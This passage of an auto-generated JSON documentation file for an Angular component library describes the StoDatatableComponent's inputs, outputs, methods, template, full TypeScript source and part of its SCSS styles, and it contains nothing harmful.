        "DoCheck"
      ],
      "accessors": {
        "cssClass": {
          "name": "cssClass",
          "getSignature": {
            "name": "cssClass",
            "type": "",
            "returnType": "",
            "line": 48
          }
        }
      },
      "templateData": "<!--<div>-->\n<ng-container *ngIf=\"compressedView; else regular\">\n  <ng-template [ngTemplateOutlet]=\"responsiveView\"\n               [ngTemplateOutletContext]=\"{row: row}\">\n  </ng-template>\n</ng-container>\n<ng-template #regular>\n  <div class=\"sto-mdl-table__body__row__cell\"\n       [ngClass]=\"column.cellClass | exec:row[column.prop]:column:row\"\n       [ngStyle]=\"column | columnStyle:columnMode\"\n       (contextmenu)=\"rowContextMenu.emit({event: $event, column: column, row: row, index: rowIndex})\"\n       *ngFor=\"let column of columns; trackBy: trackColumn\">\n    <span *ngIf=\"!column.cellTemplate\"\n          [title]=\"row[column.prop] || ''\">{{ row[column.prop] }}</span>\n    <ng-template #cellTemplate\n                 *ngIf=\"column.cellTemplate\"\n                 [ngTemplateOutlet]=\"column.cellTemplate\"\n                 [ngTemplateOutletContext]=\"{row: row, column: column, value: row[column.prop], index: rowIndex}\">\n    </ng-template>\n  </div>\n</ng-template>\n<!--</div>-->\n"
    },
    {
      "name": "StoDatatableComponent",
      "id": "component-StoDatatableComponent-bbe89ca2a7699318c0c359c38a942d1f0776b4f02c317fd5ac63d4963a29d758ac1fe2f578cb2486c9fcd60383db5c17a8eb9a298609b0e32ea47d69c58273a8",
      "file": "libs/datatable/src/lib/sto-datatable/sto-datatable.component.ts",
      "changeDetection": "ChangeDetectionStrategy.OnPush",
      "encapsulation": [
        "ViewEncapsulation.None"
      ],
      "entryComponents": [],
      "inputs": [],
      "outputs": [],
      "providers": [],
      "selector": "sto-datatable",
      "styleUrls": [
        "./sto-datatable.component.scss",
        "./sto-datatable-progress-bar.scss"
      ],
      "styles": [],
      "templateUrl": [
        "./sto-datatable.component.html"
      ],
      "viewProviders": [],
      "inputsClass": [
        {
          "name": "autoSize",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 182,
          "type": "boolean",
          "decorators": []
        },
        {
          "name": "autoSizeOffset",
          "defaultValue": "0",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 184,
          "type": "number",
          "decorators": []
        },
        {
          "name": "columnGroups",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 220,
          "type": "ColumnGroup[]",
          "decorators": []
        },
        {
          "name": "columnMode",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 114,
          "type": "ColumnDisplay",
          "decorators": []
        },
        {
          "name": "columns",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 123,
          "type": "Column[]",
          "decorators": []
        },
        {
          "name": "disableRipple",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 170,
          "type": "boolean",
          "decorators": []
        },
        {
          "name": "elevation",
          "defaultValue": "true",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 217,
          "type": "boolean",
          "decorators": []
        },
        {
          "name": "emptyMessage",
          "defaultValue": "`No records in set`",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 161,
          "type": "string",
          "decorators": []
        },
        {
          "name": "externalSort",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 208,
          "type": "boolean",
          "decorators": []
        },
        {
          "name": "footerRow",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 99,
          "type": "any",
          "decorators": []
        },
        {
          "name": "groups",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 141,
          "type": "Array<Group>",
          "decorators": []
        },
        {
          "name": "headerHeight",
          "defaultValue": "24",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 163,
          "type": "number",
          "decorators": []
        },
        {
          "name": "height",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 40,
          "type": "number",
          "decorators": []
        },
        {
          "name": "loading",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 176,
          "type": "boolean",
          "decorators": []
        },
        {
          "name": "preserveSort",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 186,
          "type": "boolean",
          "decorators": []
        },
        {
          "name": "resizeable",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 239,
          "type": "boolean",
          "decorators": []
        },
        {
          "name": "responsive",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 202,
          "type": "boolean",
          "decorators": []
        },
        {
          "name": "responsiveBreakPoint",
          "defaultValue": "400",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 206,
          "type": "number",
          "decorators": []
        },
        {
          "name": "responsiveView",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 204,
          "type": "TemplateRef<>",
          "decorators": []
        },
        {
          "name": "rowClass",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 213,
          "type": "rowClassFn",
          "decorators": []
        },
        {
          "name": "rowHeight",
          "defaultValue": "36",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 156,
          "type": "number",
          "decorators": []
        },
        {
          "name": "rows",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 71,
          "type": "T[]",
          "decorators": []
        },
        {
          "name": "scrollbarH",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 159,
          "type": "boolean",
          "decorators": []
        },
        {
          "name": "selected",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 191,
          "type": "T",
          "decorators": []
        },
        {
          "name": "selectionMode",
          "defaultValue": "SelectionModes.Click",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 165,
          "type": "SelectionModes",
          "decorators": []
        },
        {
          "name": "sortable",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 168,
          "type": "boolean",
          "decorators": []
        },
        {
          "name": "trackBy",
          "defaultValue": "(index: number, item: T) => {\n    return index;\n  }",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 265,
          "type": "(index: number, item: T) => number",
          "decorators": []
        },
        {
          "name": "virtualScroll",
          "defaultValue": "true",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 197,
          "type": "boolean",
          "decorators": []
        }
      ],
      "outputsClass": [
        {
          "name": "headerContextMenu",
          "defaultValue": "new EventEmitter<HeaderContextMenu>()",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 231,
          "type": "EventEmitter"
        },
        {
          "name": "resized",
          "defaultValue": "new EventEmitter<Column>()",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 227,
          "type": "EventEmitter"
        },
        {
          "name": "rowActivate",
          "defaultValue": "new EventEmitter<RowActivation<T>>()",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 233,
          "type": "EventEmitter"
        },
        {
          "name": "rowContextMenu",
          "defaultValue": "new EventEmitter<RowContextMenu<T>>()",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 229,
          "type": "EventEmitter"
        },
        {
          "name": "select",
          "defaultValue": "new EventEmitter<RowSelection<T>>()",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 225,
          "type": "EventEmitter"
        },
        {
          "name": "sortChanged",
          "defaultValue": "new EventEmitter<{ sort: Sort, column: Column }>()",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 235,
          "type": "EventEmitter"
        }
      ],
      "propertiesClass": [
        {
          "name": "_columnMode",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "ColumnDisplay",
          "optional": false,
          "description": "",
          "line": 199,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "_columns",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Column[]",
          "optional": false,
          "description": "",
          "line": 222,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "_footerRow",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "T",
          "optional": false,
          "description": "",
          "line": 193,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "_height",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "number",
          "optional": false,
          "description": "",
          "line": 174,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "_internalRows",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "T[]",
          "optional": false,
          "description": "",
          "line": 189,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "_resizeable",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "boolean",
          "optional": false,
          "description": "",
          "line": 250,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "_rows",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "T[]",
          "optional": false,
          "description": "",
          "line": 188,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "actions",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "StoDatatableActionsComponent",
          "optional": false,
          "description": "",
          "line": 154,
          "decorators": [
            {
              "name": "ContentChild",
              "stringifiedArguments": "StoDatatableActionsComponent"
            }
          ]
        },
        {
          "name": "activeSort",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Sort | null",
          "optional": false,
          "description": "",
          "line": 257,
          "modifierKind": [
            123
          ]
        },
        {
          "name": "body",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "StoDatatableBodyComponent<T>",
          "optional": false,
          "description": "",
          "line": 152,
          "decorators": [
            {
              "name": "ViewChild",
              "stringifiedArguments": "StoDatatableBodyComponent"
            }
          ]
        },
        {
          "name": "ColumnDisplay",
          "defaultValue": "ColumnDisplay",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 172
        },
        {
          "name": "columnTotalWidth",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "number",
          "optional": false,
          "description": "",
          "line": 253,
          "modifierKind": [
            123
          ]
        },
        {
          "name": "destroyed$",
          "defaultValue": "new Subject()",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 37,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "height$",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Observable<number>",
          "optional": false,
          "description": "",
          "line": 177,
          "modifierKind": [
            123
          ]
        },
        {
          "name": "resizeTimeout",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "number | undefined",
          "optional": false,
          "description": "",
          "line": 252,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "rowTotalHeight",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "number",
          "optional": false,
          "description": "",
          "line": 178,
          "modifierKind": [
            123
          ]
        },
        {
          "name": "scrollLeft",
          "defaultValue": "'translate3d(0px, 0px, 0px)'",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string",
          "optional": false,
          "description": "",
          "line": 255,
          "modifierKind": [
            123
          ]
        },
        {
          "name": "scrollNum",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "number",
          "optional": false,
          "description": "",
          "line": 256,
          "modifierKind": [
            123
          ]
        },
        {
          "name": "smallScreen",
          "defaultValue": "false",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 210,
          "decorators": [
            {
              "name": "HostBinding",
              "stringifiedArguments": "'class.responsive'"
            }
          ],
          "modifierKind": [
            123
          ]
        }
      ],
      "methodsClass": [
        {
          "name": "defaultSortFn",
          "args": [
            {
              "name": "a",
              "type": "T",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "b",
              "type": "T",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "col",
              "type": "Column",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "0 | 1 | -1",
          "typeParameters": [],
          "line": 374,
          "deprecated": false,
          "deprecationMessage": "",
          "modifierKind": [
            121
          ],
          "jsdoctags": [
            {
              "name": "a",
              "type": "T",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "b",
              "type": "T",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "col",
              "type": "Column",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "ngAfterViewInit",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 278,
          "deprecated": false,
          "deprecationMessage": ""
        },
        {
          "name": "ngOnDestroy",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 298,
          "deprecated": false,
          "deprecationMessage": ""
        },
        {
          "name": "onResize",
          "args": [
            {
              "type": "literal type",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 386,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "type": "literal type",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "rowClick",
          "args": [
            {
              "name": "row",
              "type": "T",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "index",
              "type": "number",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "event",
              "type": "MouseEvent",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 269,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "row",
              "type": "T",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "index",
              "type": "number",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "event",
              "type": "MouseEvent",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "scrollBodyAndHeader",
          "args": [
            {
              "name": "event",
              "type": "Event",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 345,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "event",
              "type": "Event",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "scrollTo",
          "args": [
            {
              "name": "item",
              "type": "T | number",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "behaviour",
              "type": "ScrollBehavior",
              "deprecated": false,
              "deprecationMessage": "",
              "defaultValue": "'smooth'"
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 313,
          "deprecated": false,
          "deprecationMessage": "",
          "modifierKind": [
            123
          ],
          "jsdoctags": [
            {
              "name": "item",
              "type": "T | number",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "behaviour",
              "type": "ScrollBehavior",
              "deprecated": false,
              "deprecationMessage": "",
              "defaultValue": "'smooth'",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "scrollToIndex",
          "args": [
            {
              "name": "index",
              "type": "number",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "behaviour",
              "type": "ScrollBehavior",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 307,
          "deprecated": false,
          "deprecationMessage": "",
          "modifierKind": [
            121
          ],
          "jsdoctags": [
            {
              "name": "index",
              "type": "number",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "behaviour",
              "type": "ScrollBehavior",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "setAutoSize",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 326,
          "deprecated": false,
          "deprecationMessage": "",
          "modifierKind": [
            121
          ]
        },
        {
          "name": "setHeaderScroll",
          "args": [
            {
              "name": "event",
              "type": "Event",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 339,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "event",
              "type": "Event",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "sort",
          "args": [
            {
              "name": "sort",
              "type": "Sort",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 350,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "sort",
              "type": "Sort",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "trackColumnsFn",
          "args": [
            {
              "name": "index",
              "type": "number",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "item",
              "type": "Column",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "any",
          "typeParameters": [],
          "line": 274,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "index",
              "type": "number",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "item",
              "type": "Column",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        }
      ],
      "deprecated": false,
      "deprecationMessage": "",
      "hostBindings": [
        {
          "name": "class.responsive",
          "defaultValue": "false",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 210,
          "type": "boolean",
          "decorators": []
        }
      ],
      "hostListeners": [],
      "description": "",
      "rawdescription": "\n",
      "type": "component",
      "sourceCode": "import {\n  AfterViewInit,\n  ChangeDetectionStrategy,\n  ChangeDetectorRef,\n  Component,\n  ContentChild,\n  ElementRef,\n  EventEmitter,\n  HostBinding,\n  Input,\n  NgZone,\n  OnDestroy,\n  Output,\n  TemplateRef,\n  ViewChild,\n  ViewEncapsulation\n} from '@angular/core';\nimport { Column, ColumnDisplay, ColumnGroup, Group } from './columns';\nimport { HeaderContextMenu, RowActivation, RowContextMenu, RowSelection } from './events';\nimport { StoDatatableBodyComponent } from './sto-datatable-body/sto-datatable-body.component';\nimport { fromEvent, Observable, of, Subject } from 'rxjs';\nimport { debounceTime, map, startWith, takeUntil, tap } from 'rxjs/operators';\nimport { SelectionModes } from './selection-modes';\nimport { rowClassFn } from './models';\nimport { StoDatatableActionsComponent } from './sto-datatable-actions/sto-datatable-actions.component';\nimport { Sort } from '@angular/material/sort';\nimport { observeWidth } from './observer';\n\n@Component({\n  selector: 'sto-datatable',\n  templateUrl: './sto-datatable.component.html',\n  styleUrls: [ './sto-datatable.component.scss', './sto-datatable-progress-bar.scss' ],\n  encapsulation: ViewEncapsulation.None,\n  changeDetection: ChangeDetectionStrategy.OnPush,\n})\nexport class StoDatatableComponent<T extends Record<string, unknown>> implements AfterViewInit, OnDestroy {\n  private destroyed$ = new Subject();\n\n  @Input()\n  get height() {\n    return this._height;\n  }\n\n  set height(height: number) {\n    this._height = height;\n    if ( !this.autoSize ) {\n      this.height$ = of(height);\n    }\n  }\n\n  get bodyHeight() {\n    if ( !this.height || !this.body ) {\n      return null;\n    }\n    const hasHeader = !this.responsive || ( this.responsive && !this.smallScreen );\n    const hasFooter = this.footerRow && ( !this.responsive || ( this.responsive && !this.smallScreen ) );\n    const hasHeaderGroup = ( !this.responsive || ( this.responsive && !this.smallScreen ) ) && this.columnGroups;\n    const headerOffset = hasHeader ? this.headerHeight : 0;\n    const actionsHeight = this.actions ? this.actions.height : 0;\n    let footerOffset = 0;\n    if ( hasFooter && this.footerRow instanceof Array ) {\n      footerOffset = this.rowHeight * this.footerRow.length;\n    } else if ( hasFooter ) {\n      footerOffset = this.rowHeight;\n    }\n    const groupOffset = hasHeaderGroup ? this.headerHeight : 0;\n    return this.height - headerOffset - footerOffset - groupOffset - actionsHeight;\n  }\n\n  @Input()\n  set rows(rows: T[]) {\n    this._rows = rows;\n    let sortedRows = [ ...( rows || [] ) ];\n    if ( !this.preserveSort && !this.externalSort ) {\n      this.activeSort = null;\n    }\n\n    if ( this.activeSort && !this.externalSort ) {\n      const column = this.columns.find(col => col.$$id === this.activeSort?.active);\n      const sortDir = this.activeSort.direction;\n      if ( column ) {\n        const fn = column.sortFn || this.defaultSortFn;\n        sortedRows = [ ...rows ].sort((a, b) => fn(a, b, column));\n        if ( sortDir === 'desc' ) {\n          sortedRows.reverse();\n        }\n      }\n    }\n\n    this.rowTotalHeight = ( rows || [] ).length * this.rowHeight;\n    this._internalRows = [ ...( sortedRows || [] ) ];\n  }\n\n  get rows() {\n    return this._internalRows;\n  }\n\n  @Input('footerRow')\n  get footerRow() {\n    if ( this._footerRow && typeof this._footerRow === 'object' ) {\n      if ( this._footerRow instanceof Array ) {\n        return this._footerRow;\n      }\n      return [ this._footerRow ];\n    }\n  }\n\n  // eslint-disable-next-line @typescript-eslint/no-explicit-any\n  set footerRow(row: any) {\n    this._footerRow = row;\n  }\n\n  @Input()\n  get columnMode(): ColumnDisplay {\n    return this._columnMode || ColumnDisplay.Flex;\n  }\n\n  set columnMode(columnMode: ColumnDisplay) {\n    this._columnMode = columnMode;\n  }\n\n  @Input()\n  get columns(): Column[] {\n    return this._columns;\n  }\n\n  set columns(columns: Column[]) {\n    if ( columns ) {\n      this._columns = columns\n        .map((column, index) => ( {\n          ...column,\n          $$id: btoa(`${column.prop}${column.name}${index}`),\n          flexShrink: this.resizeable ? 0 : column.flexShrink,\n          flexGrow: this.resizeable ? 0 : column.flexGrow,\n        } ));\n      this.columnTotalWidth = columns.map(c => c.flexBasis || 80).reduce((a, b) => a + b, 0);\n    }\n  }\n\n  @Input()\n  groups: Array<Group>;\n\n  get width() {\n    if ( this.scrollbarH && this.columns ) {\n      const widthOffset = this.bodyHeight && this.rowTotalHeight > this.bodyHeight ? 12 : 0;\n      return `${this.columnTotalWidth + widthOffset}px`;\n    }\n    return 'auto';\n  }\n\n  @ViewChild(StoDatatableBodyComponent)\n  body: StoDatatableBodyComponent<T>;\n  @ContentChild(StoDatatableActionsComponent)\n  actions: StoDatatableActionsComponent;\n  @Input()\n  rowHeight = 36;\n  @HostBinding('class.horizontal-scroll')\n  @Input()\n  scrollbarH: boolean;\n  @Input()\n  emptyMessage = `No records in set`;\n  @Input()\n  headerHeight = 24;\n  @Input()\n  selectionMode: SelectionModes = SelectionModes.Click;\n  @HostBinding('class.sortable')\n  @Input()\n  sortable: boolean;\n  @Input()\n  disableRipple: boolean;\n\n  ColumnDisplay = ColumnDisplay;\n\n  private _height: number;\n  @Input()\n  loading: boolean;\n  public height$: Observable<number>;\n  public rowTotalHeight: number;\n\n  @HostBinding('class.autosize')\n  @Input()\n  autoSize: boolean;\n  @Input()\n  autoSizeOffset = 0;\n  @Input()\n  preserveSort: boolean;\n\n  private _rows: T[];\n  private _internalRows: T[];\n  @Input()\n  selected: T;\n\n  private _footerRow: T;\n\n  @HostBinding('class.virtual-scroll')\n  @Input()\n  virtualScroll = true;\n\n  private _columnMode: ColumnDisplay;\n\n  @Input()\n  responsive: boolean;\n  @Input()\n  responsiveView: TemplateRef<unknown>;\n  @Input()\n  responsiveBreakPoint = 400;\n  @Input()\n  externalSort: boolean;\n  @HostBinding('class.responsive')\n  public smallScreen = false;\n\n  @Input()\n  rowClass: rowClassFn;\n\n  @HostBinding('class.mat-elevation-z3')\n  @Input()\n  elevation = true;\n\n  @Input()\n  columnGroups: ColumnGroup[];\n\n  private _columns: Column[];\n  @Output()\n    // eslint-disable-next-line @angular-eslint/no-output-native\n  select = new EventEmitter<RowSelection<T>>();\n  @Output()\n  resized = new EventEmitter<Column>();\n  @Output()\n  rowContextMenu = new EventEmitter<RowContextMenu<T>>();\n  @Output()\n  headerContextMenu = new EventEmitter<HeaderContextMenu>();\n  @Output()\n  rowActivate = new EventEmitter<RowActivation<T>>();\n  @Output()\n  sortChanged = new EventEmitter<{ sort: Sort, column: Column }>();\n\n  @HostBinding('class.resizeable')\n  @Input()\n  get resizeable(): boolean {\n    return this._resizeable;\n  };\n\n  set resizeable(resizeable: boolean) {\n    this._resizeable = resizeable;\n    if ( resizeable && this._columns ) {\n      this.columns = this._columns;\n    }\n  }\n\n  private _resizeable: boolean;\n\n  private resizeTimeout: number | undefined;\n  public columnTotalWidth: number;\n\n  public scrollLeft = 'translate3d(0px, 0px, 0px)';\n  public scrollNum: number;\n  public activeSort: Sort | null;\n\n  constructor(private elRef: ElementRef, private cdr: ChangeDetectorRef, private zone: NgZone) {\n  }\n\n\n  @Input()\n    // eslint-disable-next-line @typescript-eslint/no-unused-vars\n  trackBy = (index: number, item: T) => {\n    return index;\n  };\n\n  rowClick(row: T, index: number, event: MouseEvent) {\n    this.selected = row;\n    this.select.emit({ row, index, event });\n  }\n\n  trackColumnsFn(index: number, item: Column) {\n    return item.$$id;\n  }\n\n  ngAfterViewInit() {\n    if ( this.autoSize ) {\n      this.setAutoSize();\n    }\n    if ( this.responsive && !this.responsiveView ) {\n      console.error('Responsive mode set to true, but no view passed in. Please pass in responsiveView (templateRef)');\n      this.responsive = false;\n    } else if ( this.responsive ) {\n      observeWidth(this.elRef.nativeElement)\n        .pipe(\n          takeUntil(this.destroyed$)\n        ).subscribe(width => {\n        this.zone.run(() => {\n          this.smallScreen = width < this.responsiveBreakPoint;\n          this.cdr.markForCheck();\n        });\n      });\n    }\n  }\n\n  ngOnDestroy(): void {\n    if ( this.resizeTimeout ) {\n      clearTimeout(this.resizeTimeout);\n    }\n    this.destroyed$.next(true);\n    this.destroyed$.complete();\n  }\n\n\n  private scrollToIndex(index: number, behaviour: ScrollBehavior) {\n    if ( this.body.vScroller ) {\n      this.body.vScroller.scrollToIndex(index, behaviour);\n    }\n  }\n\n  public scrollTo(item: T | number, behaviour: ScrollBehavior = 'smooth') {\n    if ( this.body.vScroller ) {\n      if ( typeof item === 'number' ) {\n        this.scrollToIndex(item, behaviour);\n      } else {\n        const index = this.rows.indexOf(item);\n        if ( index >= 0 ) {\n          this.scrollToIndex(index, behaviour);\n        }\n      }\n    }\n  }\n\n  private setAutoSize() {\n    const el = this.elRef.nativeElement as HTMLElement;\n    this.height$ = fromEvent(window, 'resize')\n      .pipe(\n        startWith(null),\n        debounceTime(20), // ~1 animation frame\n        map(() => el.getBoundingClientRect()),\n        map(rect => rect.top),\n        map(top => window.innerHeight - top - 16 - this.autoSizeOffset - ( this.actions ? 6 : 0 )),\n        tap(height => this.height = height)\n      );\n  }\n\n  setHeaderScroll(event: Event) {\n    const left = ( event.target as HTMLElement ).scrollLeft;\n    this.scrollLeft = `translate3d(-${left}px, 0px, 0px)`;\n    this.cdr.detectChanges();\n  }\n\n  scrollBodyAndHeader(event: Event) {\n    const left = ( event.target as HTMLElement ).scrollLeft;\n    this.scrollLeft = `translate3d(-${left}px, 0px, 0px)`;\n  }\n\n  sort(sort: Sort) {\n    if ( !sort.active || sort.direction === '' ) {\n      this._internalRows = [ ...this._rows ];\n      this.activeSort = null;\n      return;\n    }\n    this.activeSort = sort;\n    const column = this.columns.find(c => c.$$id === sort.active);\n    if ( !column ) {\n      return;\n    }\n    if ( this.externalSort ) {\n      this.sortChanged.emit({ sort, column });\n      return;\n    }\n    const fn = column.sortFn || this.defaultSortFn;\n    this._internalRows = [ ...this._rows ].sort((a, b) => {\n      const n = fn(a, b, column);\n      return n * ( sort.direction === 'asc' ? 1 : -1 );\n    });\n    this.cdr.detectChanges();\n    this.cdr.markForCheck();\n  }\n\n  private defaultSortFn(a: T, b: T, col: Column) {\n    // eslint-disable-next-line @typescript-eslint/ban-ts-comment\n    // @ts-ignore\n    const aValue = a[ col.prop ];\n    // eslint-disable-next-line @typescript-eslint/ban-ts-comment\n    // @ts-ignore\n    const bValue = b[ col.prop ];\n    // eslint-disable-next-line @typescript-eslint/ban-ts-comment\n    // @ts-ignore\n    return aValue === bValue ? 0 : aValue < bValue ? -1 : 1;\n  }\n\n  onResize({ columns, column }: { columns: Column[], column: Column }) {\n    this.columns = [ ...columns ]\n      .map(c => {\n        // Disallow grow/shrink if resizing\n        c.flexGrow = 0;\n        c.flexShrink = 0;\n        return c;\n      });\n\n    this.resized.emit(column);\n  }\n}\n",
      "assetsDirs": [],
      "styleUrlsData": [
        {
          "data": "@import \"./sto-datatable-mixins\";\n\n$space: 4px;\n$space-2x: $space * 2;\n\n$datatable-header-vertical-padding: $space-2x;\n$datatable-header-horizontal-padding: $space-2x;\n$datatable-header-font-size: 11px;\n$datatable-vertical-padding: $space-2x;\n$datatable-horizontal-padding: $space-2x;\n\n$content-height: 20px;\n\n.sto-mdl-table {\n  transition: height 225ms cubic-bezier(0.4, 0.0, 0.2, 1);\n  position: relative;\n  width: 100%;\n  border-collapse: collapse;\n  white-space: nowrap;\n\n  &__row--scroll-offset {\n    padding-right: 12px;\n  }\n\n  &__actions {\n    display: flex;\n    align-items: center;\n    justify-content: space-between;\n\n    &__left {\n      display: flex;\n      flex: 1 1 auto;\n    }\n\n    &__right {\n      display: flex;\n      flex: 1 1 auto;\n      justify-content: flex-end;\n    }\n  }\n\n  &__header {\n    &__row {\n      display: flex;\n      align-items: center;\n\n      &__cell {\n        height: 100%;\n        font-weight: 400;\n        flex: 1 0 50px;\n        overflow: hidden;\n        text-align: left;\n        padding: 0 $datatable-horizontal-padding;\n        position: relative;\n        vertical-align: bottom;\n        text-overflow: ellipsis;\n        box-sizing: border-box;\n\n        &__content {\n          flex: 1 1 auto;\n        }\n\n        &__resize-handle {\n          flex: 0 0 9px;\n          visibility: hidden;\n          cursor: col-resize;\n          position: relative;\n        }\n\n        &:hover &__resize-handle {\n          visibility: visible;\n        }\n      }\n    }\n  }\n\n  &__header-group {\n    &__cell {\n      position: absolute;\n      overflow: hidden;\n    }\n  }\n\n  &__body {\n    &--scrollbar-h {\n      .cdk-virtual-scroll-content-wrapper {\n        width: fit-content;\n      }\n    }\n  }\n\n  &__body, &__footer {\n    &--selectable &__row {\n      cursor: pointer;\n  